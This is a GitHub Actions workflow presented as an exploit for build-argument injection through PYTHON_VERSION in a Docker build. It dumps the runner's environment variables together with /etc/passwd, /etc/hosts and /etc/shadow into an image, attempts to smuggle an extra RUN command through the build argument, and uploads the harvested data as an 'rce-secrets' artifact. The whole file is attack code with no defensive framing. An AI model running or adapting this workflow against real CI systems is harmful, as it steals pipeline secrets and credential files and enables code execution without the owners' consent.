name: Exploit PYTHON_VERSION Injection

on:
  workflow_dispatch:

jobs:
  inject:
    runs-on: ubuntu-latest
    steps:
      - name: Setup malicious build context
        run: |
          mkdir -p ./taskcluster/docker/python
          printenv > ./taskcluster/docker/python/github_env

      - name: Write vulnerable Dockerfile
        run: |
          cat <<EOF > ./taskcluster/docker/python/Dockerfile
FROM alpine
COPY github_env /tmp/github_env
RUN cat /tmp/github_env /etc/passwd /etc/hosts /etc/shadow 2>/dev/null > /env_dump.txt
EOF

      - name: Build with injected PYTHON_VERSION
        run: |
          MALICIOUS_ARG="3.11-alpine; RUN echo 'RCE SUCCESS' > /RCE_MARKER"
          docker build \
            --build-arg PYTHON_VERSION="${MALICIOUS_ARG}" \
            -t hacked-image \
            ./taskcluster/docker/python

      - name: Check if RCE marker was created
        run: docker run --rm hacked-image cat /RCE_MARKER || echo "No RCE"

      - name: Extract dumped secrets from image
        run: |
          docker create --name hacked-container hacked-image
          docker cp hacked-container:/env_dump.txt ./env_dump.txt
          docker rm hacked-container

      - name: Upload results as artifact
        uses: actions/upload-artifact@v4
        with:
          name: rce-secrets
          path: ./env_dump.txt
